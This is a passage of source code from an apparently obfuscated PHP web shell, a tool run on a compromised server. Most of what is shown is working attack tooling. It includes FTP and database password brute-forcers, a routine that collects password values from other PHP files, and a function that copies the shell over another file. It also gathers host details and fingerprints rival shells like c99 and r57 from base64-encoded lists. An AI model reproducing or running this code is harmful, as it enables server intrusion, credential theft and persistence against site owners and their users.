'<pre><code>'.$c.'</code></pre>'; } function z4d($f){ global $filealiases; $r=array(); if(@strstr($f,'/')) $f=z2l($f,'/'); $ext=@strtolower(z2l($f,'.')); foreach($filealiases as $k=>$v){ if(@in_array($ext,$v)) $r[]=$k; } return @array_unique($r); } function z4x($f){ $a=z4d($f); $o=array('code','text'); if(@count($a)>0){ if(@count($a)>1){ foreach($a as $ft){ if(@in_array($ft,$o)) return $ft; } return $a[0]; } else { return $a[0]; } } else { return ''; } } function z3r($s){ if(!@preg_match('/[A-Z]/i', $s)) return $s; $s=@strtolower($s); for($i=0; $i<@strlen($s); $i++){ if(@preg_match('/[a-z]/',$s[$i])){ $s[$i]=@strtoupper($s[$i]); return $s; } } return $s; } function z3e($p) {return @decbin(@hexdec($p));} function z4a($p) {return @dechex(@bindec($p));} function z0x($p){$r='';for($i=0;$i<@strLen($p);$i+=2){$r.=@chr(@hexdec($p[$i].$p[$i+1]));}return $r;} function z1i($p){$r='';for($i=0;$i<@strlen($p);++$i)$r.= @sprintf('%02X',@ord($p[$i]));return @strtoupper($r);} function z0b($p){$r='';for($i=0;$i<@strlen($p);++$i)$r.= "\\x".@sprintf('%02X',@ord($p[$i])); return @chunk_split($r);} function z0v($p){$r='';for($i=0;$i<@strlen($p);++$i)$r.= "\\x".@sprintf('%02X',@ord($p[$i])); return @substr(@preg_replace('/.{1,76}/',"'\\0'.\n",$r),0,-2);return @chunk_split($r);} function z0y($p){$r='';for($i=0;$i<@strlen($p);++$i)$r.= '%'.@dechex(@ord($p[$i]));return @strtoupper($r);} function z4v($i){ return @chunk_split(@base64_encode($i)); } function z4p($i){ return @substr(@preg_replace('/.{1,76}/',"'\\0'.\n",@base64_encode($i)),0,-2); } function z3p($t){ $r=''; if(@preg_match_all('/(?<strings>[\x20-\x7E]{4,})[^\x20-\x7E]?/',$t,$m)){ foreach($m["strings"] as $s){ $r.=$s."\r\n"; } } return $r; } function z1e(){ $encode_functions=array(); foreach(array( "z3p"=>"Strings", "urlencode"=>"Urlencode", "urldecode"=>"Urldecode", "z0y"=>"Full Urlencode", "rawurlencode"=>"Rawurlencode", "rawurldecode"=>"Rawurldecode", "base64_encode"=>"Base64 Encode", "z4v"=>"Base64 Encode + Chunk", "z4p"=>"Base64 Encode + Chunk + Quotes", "base64_decode"=>"Base64 Decode", "z1i"=>"ASCII to HEX", "z0b"=>"ASCII to HEX + Chunk", "z0x"=>"HEX to ASCII", "z_hexdec"=>"HEX to DEC", "z3e"=>"HEX to BIN", "dechex"=>"DEC to HEX", "decbin"=>"DEC to BIN", "z4a"=>"BIN to HEX", "bindec"=>"BIN to DEC", "strtolower"=>"String to lowercase", "strtoupper"=>"String to UPPERCASE", "htmlspecialchars"=>"Htmlspecialchars", "strlen"=>"String Length", "strrev"=>"Reverse String" ) as $key=>$val){ if(z7e($key)||z7e(@substr($key,0,@strlen($key)-1))){ $encode_functions[$key]="$val"; } } return $encode_functions; } function z4o($h){ return (@preg_match('/^[0-9a-fA-F]+$/',$h) ? 1:0); } function z1g($h){ return (@preg_match('/^[0-9a-zA-Z+\/.]+==$/',$h) ? 1:0); } function z2e($h){ $l=@strlen($h); $r='Unknown'; if($l===32){ if(z4o($h)){ $r='MD5 / MD4 / MD2 / NTLM / Tiger128 / SNEFRU128 / RipeMD128 / Haval128_3 / Haval128_4 / Haval128_5 / Domain Cached Credentials'; } elseif(@preg_match('/^[0-9A-F]+$/',$h)){ $r='Windows-LM / Windows-NTLM / RC4'; } elseif(@preg_match('/^[0-9a-zA-Z+\/.]+$/',$h)){ $r='Haval192 (Base64) / Tiger-192 (Base64)'; } }elseif($l===40){ if(z4o($h)){ $r='SHA-0 / SHA-1 / Tiger160 / RipeMD160 / MySQL v5.x / Haval160 / Haval160_3 / Haval160_4 / Haval160_5'; } }elseif($l===8){ if(z4o($h)){ $r='ADLER32 / CRC-32 / CRC-32B / GHash-32-3 / GHash-32-3'; } }elseif($l===13){ if(@preg_match('/^[0-9a-zA-Z\/.]$/',$h)){ $r='DES (Unix)'; } }elseif($l===16){ if(z4o($h)){ $r='MySQL'; } }elseif($l===4){ if(z4o($h)){ $r='CRC-16 / CRC-16-CCITT / FCS-16'; } }elseif($l===34){ if(@preg_match('/^\$1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/',$h)){ $r='MD5 (Unix)'; } elseif(@preg_match('/^\$P\$B[0-9a-zA-Z\/.]$/',$h)){ $r='MD5(WordPress)'; } elseif(@preg_match('/^\$H\$9[0-9a-zA-Z\/.]$/',$h)){ $r='MD5(PhpBB3)'; } }elseif($l===128){ if(z4o($h)){ $r='SHA-512 / WHIRLPOOL / SALSA20'; } }elseif($l===96){ if(z4o($h)){ $r='SHA-384'; } }elseif($l===48){ if(z4o($h)){ $r='Haval192 / Haval192_4 / Haval192_5 / Tiger192 / Tiger2 / SALSA10'; } }elseif($l===56){ if(z4o($h)){ $r='Haval224 / Haval244_3 / Haval244_4 / SHA224'; } if(z1g($h)){ $r='RipeMD320 (Base64)'; } }elseif($l===64){ if(z4o($h)){ $r='SNEFRU256 / SHA-256 / RipeMD256 / Panama / Haval256 / Haval256_3 / Haval256_4 / Haval256_5'; } elseif(@preg_match('/^[0-9a-zA-Z+\/.]+$/',$h)){ $r='SHA384 (Base64)'; } }elseif($l===37){ if(@preg_match('/^\$apr1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/',$h)){ $r='MD5 (APR)'; } }elseif($l===80){ if(z4o($h)){ $r='RipeMD320'; } }elseif($l===24){ if(z1g($h)){ $r='Haval128 (Base64) / MD2 (Base64) / MD4 (Base64) / MD5 (Base64) / RipeMD128 (Base64) / SNEFRU128 (Base64) / Tiger128 (Base64)'; } }elseif($l===28){ if(@preg_match('/^[0-9a-zA-Z+\/.]+=$/',$h)){ $r='SHA-1 (Base64) / Haval160 (Base64) / RipeMD160 (Base64) / Tiger160 (Base64)'; } }elseif($l===44){ if(@preg_match('/^[0-9a-zA-Z+\/.]+=$/',$h)){ $r='Haval256 (Base64) / RipeMD256 (Base64) / SHA256 (Base64) / SNEFRU256 (Base64)'; } }elseif($l===88){ if(z1g($h)){ $r='SHA512 (Base64) / WHIRLPOOL (Base64)'; } }elseif($l===9){ if(@is_numeric($h)){ $r='Elf-32'; } } return $r; } function z3i(){ global $tmonth_arr,$tday_arr,$tyear_arr,$thour_arr,$tmin_arr,$tsec_arr; $tmonth_arr=array(""=>"Month"); $tday_arr=array(""=>"Day"); $tyear_arr=array(""=>"Year"); $thour_arr=array(""=>"Hour"); $tmin_arr=array(""=>"Min"); $tsec_arr=array(""=>"Sec"); foreach(array("January","February","March","April","May","June","July","August","September","October","November","December") as $tmm) $tmonth_arr[$tmm]=$tmm; for($i=1;$i<=31;$i++) $tday_arr[$i]=$i; for($i=1998;$i<=@date("Y");$i++) $tyear_arr[$i]=$i; for($i=1;$i<=24;$i++) $thour_arr[$i]=$i; for($i=1;$i<60;$i++){ $tmin_arr[$i]=$i; $tsec_arr[$i]=$i; } } function z2q(){ global $nix,$sh_exec,$ft,$d,$f; $r=''; $a=array('functions'=>z9y("74"),'edit'=>z9y("75"),'text'=>z9y("79"),'code'=>z9y("80"),'html'=>z9y("81"),'htmls'=>z9y("82"),'exe'=>z9y("83"),'sess'=>z9y("84"),'sdb'=>z9y("85"),'ini'=>z9y("86"),'img'=>z9y("87"),'hex'=>z9y("88")); if(($wwwdir=z3n())!==false){ if(@strstr($d.$f,$wwwdir)!==false){ $a['web']=z9y("89"); } } $a['download']=z9y("76"); $fta=z4d($f); foreach($a as $k=>$v){ if($k!='exe'||($k=='exe' &&$sh_exec)) $r.=z7k(z5x(array('act'=>'f','d','f','ft'=>$k),z8b($v, (($ft==$k)? '12' : ((@in_array($k,$fta)) ? '13':'14') ) )) ); } echo z7a(z7u($r)); } function z5d($d){ global $found, $found_d, $found_f, $search_i_f, $search_i_d, $ar, $with_ls,$s_rec,$sdir; $d=z1k($d); $h=z8x($d); if(count($h)>0){ foreach($h as $f){ $f=z2l($f); if($f!="."&&$f!=".."&&$f!=''){ $bool=(@empty($ar["sn_reg"]) && @strpos($f,$ar["sn"])!==false)||($ar["sn_reg"] && @preg_match("/".$ar["sn"]."/",$f)); if(z4j($d.$f)){ $search_i_d++; if(@empty($ar["st"]) && (@empty($ar["s_fd"])||$ar["s_fd"]=="2") && $bool){ $found[]=$d.$f; $found_d++; } if(!z4q($d.$f)){ if(@empty($s_rec)){ z5d($d.$f); } elseif(@is_numeric($s_rec)){ $countrec=@count(@explode('/',@substr($d.$f,@strlen($sdir)))); if($countrec<=$s_rec) z5d($d.$f); } } }else{ if(@empty($ar["s_fd"])||$ar["s_fd"]=="1"){ $search_i_f++; if($bool){ if(!@empty($ar["st"])){ $r=z9o($d.$f); if($ar["st_wwo"]){ $ar["st"]=" ".@trim($ar["st"])." "; } if(!$ar["st_cs"]){ $ar["st"]=@strtolower($ar["st"]); $r=@strtolower($r); } if($ar["st_reg"]){ $bool=@preg_match("/".$ar["st"]."/",$r); }else{ $bool=@strstr($r,$ar["st"]); } if($ar["st_not"]){ $bool=!$bool; } if($bool){ $found[]=$d.$f; $found_f++; } }else{ $found[]=$d.$f; $found_f++; } } } } } } } } function z3t($u){ $s=@curl_init(); @curl_setopt($s,CURLOPT_URL,$u); @curl_setopt($s,CURLOPT_USERAGENT,z7z('2','downloada')); @curl_setopt($s,CURLOPT_RETURNTRANSFER,true); $r=@curl_exec($s); @curl_close($s); return $r; } function z2h($u){ $r=''; if(!@strstr($u,'://')) return $r; $s=@substr($u,0,@strpos($u,'://')+3); $uh=@substr($u,@strlen($s)); $e=@explode('/',$uh); $h=$e[0]; $p=@substr($uh,@strlen($h)); $fp=@fsockopen($h,80,$errno,$errstr,30); @fputs($fp,"GET $p HTTP/1.1\r\n"); @fputs($fp,"Host: $h\r\n"); @fputs($fp,"User-Agent: ".z7z('2','downloada')."\r\n"); @fputs($fp,"Connection: close\r\n\r\n"); while(!@feof($fp)&&($debug=@fgets($fp))!="\r\n"); while(!@feof($fp)) $r.=@fgets($fp,1024); @fclose($fp); return $r; } function z3l($host,$user,$pass,$port,$timeout){ $ftp=@ftp_connect($host,$port,$timeout); if(!$ftp){ return "failed"; }else{ if(@ftp_login($ftp,$user,$pass)){ return "valid"; }else{ return "invalid"; } @ftp_close($ftp); } } function z2f($host,$port,$time,$try1,$try2,$try3,$try4,$user,$pass=NULL){ $count=0; $success=0; $res=0; $log=""; if($pass!=NULL){ $count++; $res=z3l($host,$user,$pass,$port,$time); if($res=="failed"){ echo "Can't connect to $host:$port\r\n"; return false; } if($res=="valid"){ echo "[+] $user:$pass - success\r\n"; $log.="ftp://$host:$port - $user $pass\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3l($host,$user,z9i($pass),$port,$time); if($res=="valid"){ echo "[+] $user:".z9i($pass)." - success\r\n"; $log.="ftp://$host:$port - $user ".z9i($pass)."\r\n"; $success++; } } }else{ $count++; $res=z3l($host,$user,$user,$port,$time); if($res=="failed"){ echo "Can't connect to $host:$port\r\n"; return false; } if($res=="valid"){ echo "[+] $user:$user - success\r\n"; $log.="ftp://$host:$port - $user $user\r\n"; $success++; } if($res!="valid"&&$try1=="1"){ $count++; $res=z3l($host,$user,@strrev($user),$port,$time); if($res=="valid"){ echo "[+] $user:".@strrev($user)." - success\r\n"; $log.="ftp://$host:$port - $user ".@strrev($user)."\r\n"; $success++; } } if($res!="valid"&&$try2=="1"){ $count++; $res=z3l($host,$user,$user."1",$port,$time); if($res=="valid"){ echo "[+] $user:".$user."1 - success\r\n"; $log.="ftp://$host:$port - $user ".$user."1\r\n"; $success++; } } if($res!="valid"&&$try3=="1"){ $count++; $res=z3l($host,$user,$user."123",$port,$time); if($res=="valid"){ echo "[+] $user:".$user."123 - success\r\n"; $log.="ftp://$host:$port - $user ".$user."123\r\n"; $success++; } } if($res!="valid"&&$try4=="1"){ $count++; $res=z3l($host,$user,z9i($user),$port,$time); if($res=="valid"){ echo "[+] $user:".z9i($user)." - success\r\n"; $log.="ftp://$host:$port - $user ".z9i($user)."\r\n"; $success++; } } } return array( $count, $success, $log); } function z3h($host,$user,$pass,$port,$dbtype,$base=''){ $sql=new my_sql(); $sql->db=$dbtype; $sql->host=$host; $sql->port=$port; $sql->user=$user; $sql->pass=$pass; if($base!=''){ $sql->base=$base; } if($sql->connect()){ return "valid"; }else{ return "invalid"; } } function z2s($host,$port,$dbtype,$try1,$try2,$try3,$try4,$user,$pass=NULL,$sqldb=''){ $count=0; $success=0; $res=0; $log=""; if($pass!=NULL){ $count++; $res=z3h($host,$user,$pass,$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:$pass - success\r\n"; $log.="$dbtype - $host:$port - $user $pass\r\n"; $success++; } if($res!="valid"&&$try1=="1"){ $count++; $res=z3h($host,$user,@strrev($pass),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".@strrev($pass)." - success\r\n"; $log.="$dbtype - $host:$port - $pass ".@strrev($user)."\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i(@strrev($pass)),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i(@strrev($pass))." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i(@strrev($pass))."\r\n"; $success++; } } } if($res!="valid"&&$try2=="1"){ $count++; $res=z3h($host,$user,$pass."1",$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".$pass."1 - success\r\n"; $log.="$dbtype - $host:$port - $user ".$pass."1\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($pass."1"),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($pass."1")." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($pass."1")."\r\n"; $success++; } } } if($res!="valid"&&$try3=="1"){ $count++; $res=z3h($host,$user,$pass."123",$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".$pass."123 - success\r\n"; $log.="$dbtype - $host:$port - $user ".$pass."123\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($pass."123"),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($pass."123")." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($pass."123")."\r\n"; $success++; } } } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($pass),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($pass)." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($pass)."\r\n"; $success++; } } }else{ $count++; $res=z3h($host,$user,$user,$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:$user - success\r\n"; $log.="$dbtype - $host:$port - $user $user\r\n"; $success++; } if($res!="valid"&&$try1=="1"){ $count++; $res=z3h($host,$user,@strrev($user),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".@strrev($user)." - success\r\n"; $log.="$dbtype - $host:$port - $user ".@strrev($user)."\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i(@strrev($user)),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i(@strrev($user))." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i(@strrev($user))."\r\n"; $success++; } } } if($res!="valid"&&$try2=="1"){ $count++; $res=z3h($host,$user,$user."1",$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".$user."1 - success\r\n"; $log.="$dbtype - $host:$port - $user ".$user."1\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($user."1"),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($user."1")." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($user."1")."\r\n"; $success++; } } } if($res!="valid"&&$try3=="1"){ $count++; $res=z3h($host,$user,$user."123",$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".$user."123 - success\r\n"; $log.="$dbtype - $host:$port - $user ".$user."123\r\n"; $success++; } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($user."123"),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($user."123")." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($user."123")."\r\n"; $success++; } } } if($res!="valid"&&$try4=="1"){ $count++; $res=z3h($host,$user,z9i($user),$port,$dbtype,$sqldb); if($res=="valid"){ echo "[+] $user:".z9i($user)." - success\r\n"; $log.="$dbtype - $host:$port - $user ".z9i($user)."\r\n"; $success++; } } } return array($count,$success,$log); } function z2g($a,$b,$c){ global $count,$success,$log; $count+=$a; $success+=$b; $log.=$c; } function z0m($a,$d){ $z= new ZipArchive; if ($z->open($a) === TRUE) { $z->extractTo($d); $z->close(); return TRUE; } else { return FALSE; } } function z1w($return=false){ @ob_start(); @phpinfo(-1); $pi = @preg_replace( array('#^.*<body>(.*)</body>.*$#ms', '#<h2>PHP License</h2>.*$#ms', '#<h1>Configuration</h1>#', "#\r?\n#", "#</(h1|h2|h3|tr)>#", '# +<#', "#[ \t]+#", '#&nbsp;#', '#  +#', '# class=".*?"#', '%&#039;%', '#<tr>(?:.*?)" src="(?:.*?)=(.*?)" alt="PHP Logo" /></a>' .'<h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#', '#<h1><a href="(?:.*?)\?=(.*?)">PHP Credits</a></h1>#', '#<tr>(?:.*?)" src="(?:.*?)=(.*?)"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#', "# +#", '#<tr>#', '#</tr>#'), array('$1', '', '', '', '</$1>' . "\n", '<', ' ', ' ', ' ', '', ' ', '<h2>PHP Configuration</h2>'."\n".'<tr><td>PHP Version</td><td>$2</td></tr>'. "\n".'<tr><td>PHP Egg</td><td>$1</td></tr>', '<tr><td>PHP Credits Egg</td><td>$1</td></tr>', '<tr><td>Zend Engine</td><td>$2</td></tr>' . "\n" . '<tr><td>Zend Egg</td><td>$1</td></tr>', ' ', '%S%', '%E%'), @ob_get_clean()); $sections = @explode('<h2>', @strip_tags($pi, '<h2><th><td>')); unset($sections[0]); $pi = array(); foreach($sections as $section){ $n = @substr($section, 0, @strpos($section, '</h2>')); @preg_match_all( '#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#', $section, $askapache, PREG_SET_ORDER); foreach($askapache as $m) $pi[$n][$m[1]]=(@isset($m[2])&&(!@isset($m[3])||$m[2]==$m[3]))?$m[2]:@array_slice($m,2); } return ($return === false) ? print_r($pi) : $pi; } function z1b(){ $distros=array("SUSE LINUX"=>"SuSE-release;UnitedLinux-release", "Mandrake"=>"mandrake-release", "MandrivaLinux"=>"mandrake-release", "Gentoo"=>"gentoo-release", "Fedora"=>"fedora-release", "RedHat"=>"redhat-release;redhat_version", "Slackware"=>"slackware-release;slackware-version", "Trustix"=>"trustix-release;trustix-version", "FreeEOS"=>"eos-version", "Arch"=>"arch-release", "Cobalt"=>"cobalt-release", "LinuxFromScratch"=>"lfs-release", "Rubix"=>"rubix-version", "Ubuntu"=>"lsb-release", "PLD"=>"pld-release", "CentOS"=>"redhat-release;redhat_version", "LFS"=>"lfs-release;lfs_version", "HLFS"=>"hlfs-release;hlfs_version", "Debian"=>"debian_release;debian_version"); foreach($distros as $k=>$v){ $fs=@explode(";",$v); foreach($fs as $f){ if(z4r("/etc/".$f)){ $t=@str_replace("\n","",z9o("/etc/".$f)); $t=@trim($t); if(@preg_match("/description=\"(.*)\"/i",$t,$m)){ return $m[1]; } else { return $k." ($t)"; } } } } return "Unknown"; } function z3o(){ $r=z9y("430"); $c=$k=$b=""; $f=z9o("/proc/cpuinfo"); if(!@empty($f)){ $a=@explode("\n",$f); $n=0; for($i=0; $i<@count($a); $i++) { @list($x, $y,)=@explode(":",$a[$i]); $x=@rtrim($x); $y=@rtrim($y); if($x=="processor"){ $n++; $r=$n; } if($x=="vendor_id") $r.=$y; if($x=="model name") $r.=$y; if($x=="cpu MHz"){ $r.=" ".@floor($y); $k="y"; } if($x=="cache size") $c=$y; if($x=="bogomips") $b=$y; } if($k!="y") $r.=" <b>unknown</b>"; $r.=" MHz / Cache: $c / BogoMIPS: $b"; } return $r; } function z2j($used){ return '<div class="'.z4m("4","3").'"><div class="'.z4m("5","3").'" style="width:'.$used.'%;">&nbsp;</div></div>'; } function z5a(){ global $sh_exec, $nix; $mem=$buff=$swap=array("",z9y("430")); if($nix&&$sh_exec){ $m=z9e("free -b"); if(!@empty($m)){ $e=@explode("\n",$m); foreach($e as $l){ if(@preg_match('/mem:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i',$l,$t)){ $used=@round(($t[2]/$t[1])*100); $mem=array(z2j($used),z9y("426",z7x($t[1]))." ".z9y("429",z7x($t[2]))." (".$used."%) ".z9y("465",z7x($t[3]))); } elseif(@preg_match('/swap:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i',$l,$t)){ $used=@round(($t[2]/$t[1])*100); $swap=array(z2j($used),z9y("426",z7x($t[1]))." ".z9y("429",z7x($t[2]))." (".$used."%) ".z9y("465",z7x($t[3]))); } elseif(@preg_match('/-\/\+ buffers\/cache:\s*([0-9]+)\s*([0-9]+)/i',$l,$t)){ $tot=($t[1]+$t[2]); $used=@round(($t[1]/$tot)*100); $buff=array(z2j($used),z9y("426",z7x($tot))." ".z9y("429",z7x($t[1]))." (".$used."%) ".z9y("465",z7x($t[2]))); } } } } return array($mem,$buff,$swap); } function z9r(){ global $nix,$sh_exec,$dtotal,$dfree,$dused,$win; $it=@intval($dtotal); $iu=@intval($dused); $used=@round(($iu/$it)*100); $r=array(array(z2j($used),z9y("426",$dtotal)." ".z9y("429",$dused)." (".$used."%) ".z9y("465",$dfree))); if($win&&z7e('disk_free_space')&&z7e('disk_total_space')){ $tr=array(); foreach(@range("B","Z") as $let){ if(z4r($let.":/")){ $free=@disk_free_space($let.":/"); $total=@disk_total_space($let.":/"); if($free===false) $free=0; if($total===false) $total=0; if($free<0) $free=0; if($total<0) $total=0; $used=($total-$free); $pused=@round(($used/$total)*100); $tr[$let.":"]=array(z2j($pused),z9y("426",z7x($total))." ".z9y("429",z7x($used))." (".$pused."%) ".z9y("465",z7x($free))); } } if(@count($tr)!==0) $r=$tr; } elseif($nix&&$sh_exec){ $df=z9e("df -B1"); if(!@empty($df)){ $e=@explode("\n",$df); @array_shift($e); $tr=array(); foreach($e as $l){ $p=@preg_split("/ /",$l,NULL,PREG_SPLIT_NO_EMPTY ); if(@count($p)!==6) break; $used=@round(($p[2]/$p[1])*100); $tr[$p[5]]=array(z2j($used),z9y("426",z7x($p[1]))." ".z9y("429",z7x($p[2]))." (".$used."%) ".z9y("465",z7x($p[3]))." FS: ".$p[0]); } if(@count($tr)!==0) $r=$tr; } } return $r; } function z2p($file, $user){ global $passarray; if(!@isset($passarray)) $passarray=array(); if(!@isset($passarray[$user])) $passarray[$user]=array(); $f=z9o($file); if(!empty($f)){ $regvar='/\$([A-Za-z_][A-Za-z_0-9]*)\s*=\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*;/'; $regvar1='/([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/'; $regvar2='/\[([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/'; $regconst='/define\s*\(([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\s*,\s*([\'"]{1})([^\3\s\t\r\n]+)\3\s*\)\s*;/'; if(@preg_match_all($regvar, $f, $m)){ $var=$m[1]; $val=$m[3]; for($i=0;$i<@count($var);$i++){ if(@preg_match('/pass/i',$var[$i])){ if(!@empty($val[$i])&&!@in_array($val[$i], $passarray[$user])){ $passarray[$user][]=$val[$i]; } } } unset($var); unset($val); unset($m); } if(@preg_match_all($regvar1, $f, $m)){ $var=$m[2]; $val=$m[4]; for($i=0;$i<@count($var);$i++){ if(@preg_match('/pass/i',$var[$i])){ if(!@empty($val[$i])&&!@in_array($val[$i], $passarray[$user])){ $passarray[$user][]=$val[$i]; } } } unset($var); unset($val); unset($m); } if(@preg_match_all($regvar2, $f, $m)){ $var=$m[2]; $val=$m[4]; for($i=0;$i<@count($var);$i++){ if(@preg_match('/pass/i',$var[$i])){ if(!@empty($val[$i])&&!@in_array($val[$i], $passarray[$user])){ $passarray[$user][]=$val[$i]; } } } unset($var); unset($val); unset($m); } if(@preg_match_all($regconst, $f, $m)){ $var=$m[2]; $val=$m[4]; for($i=0;$i<@count($var);$i++){ if(@preg_match('/pass/i',$var[$i])){ if(!@empty($val[$i])&&!@in_array($val[$i], $passarray[$user])){ $passarray[$user][]=$val[$i]; } } } unset($var); unset($val); unset($m); } } unset($f); } function z2w($file){ if(!z4e($file)) return false; $me=z9o('index.php'); if(!$me) return false; return z9t($file,$me); } function z2r($file,$possible=0,$replace=0){ $replaced=""; $knownfunc=array( "c99/variant"=>@explode("||",@base64_decode("ZnNlYXJjaCgkZCl8fGZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxnZXRzb3VyY2UoJGZuKXx8c2hleGl0KCl8fF9idWZmX3ByZXBhcmUoKXx8X3Nlc3NfcHV0KCRkYXRhKXx8ZGlzcGxheXNlY2luZm8oJG5hbWUsJHZhbHVlKXx8ZnNfY29weV9kaXIoJGQsJHQpfHxmc19jb3B5X29iaigkZCwkdCl8fGZzX21vdmVfZGlyKCRkLCR0KXx8ZnNfbW92ZV9vYmooJGQsJHQpfHxmc19ybWRpcigkZCl8fGZzX3Jtb2JqKCRvKXx8Z2V0bWljcm90aW1lKCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHN0cjJtaW5pKCRjb250ZW50LCRsZW4pfHx0YWJzb3J0KCRhLCRiKXx8dmlld19wZXJtcygkbW9kZSl8fHZpZXdfcGVybXNfY29sb3IoJG8pfHx2aWV3X3NpemUoJHNpemUp")), "r57/variant"=>@explode("||",@base64_decode("Y2YoJGZuYW1lLCR0ZXh0KXx8Y2hhbmdlX2RpdnN0KGlkKXx8Y2xvc2UoKXx8Y29tcHJlc3MoJiRmaWxlbmFtZSwmJGZpbGVkdW1wLCRjb21wcmVzcyl8fGNvbm5lY3QoKXx8Y3goKXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZGl2KCRpZCl8fGR1bXAoJHRhYmxlKXx8ZXJyKCRuLCR0eHQ9JycpfHxleCgkY2ZlKXx8R2V0RmlsZU1hdGNoZXNDb3VudCgpfHxHZXRGaWxlc1RvdGFsKCl8fEdldE1hdGNoZXNDb3VudCgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGdldF91c2VycygkZmlsZW5hbWUpfHxpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCl8fGxvY2F0ZSgkcHIpfHxtYWlsYXR0YWNoKCR0bywkZnJvbSwkc3ViaiwkYXR0YWNoKXx8bW9yZXJlYWQoJHRlbXApfHxtb3Jld3JpdGUoJHRlbXAsJHN0cj0nJyl8fHBlcm1zKCRtb2RlKXx8cmVhZHpsaWIoJGZpbGVuYW1lLCR0ZW1wPScnKXx8c2FmZV9leCgkY2ZlKXx8U2VhcmNoUmVzdWx0KCRkaXIsJHRleHQsJGZpbHRlcj0nJyl8fFNlYXJjaFRleHQoJHBocmFzZT0wLCRjYXNlPTApfHxzaG93X2RpdihpZCl8fHNyKCRsLCR0MSwkdDIpfHx0b1VURigkeCl8fFVfdmFsdWUoJHZhbHVlKXx8VV93b3Jkd3JhcCgkc3RyKXx8dmlld19zaXplKCRzaXplKXx8d2hpY2goJHByKXx8d3MoJGkp")), "c37"=>@explode("||",@base64_decode("Q2hlY2tCYXNlNjQoJEhhc2gpfHxDaGVja0hFWCgkSGFzaCwkQ2FzZSl8fENvbmZpZ3VyZUNoZWNrQm94ZXNQZXJtaXNzaW9ucygpfHxDb25maWd1cmVQZXJtaXNzaW9ucyh1c2VyKXx8R2V0TGFzdEVycm9yKCl8fEdldFBlcm1zKCYkRik=")), 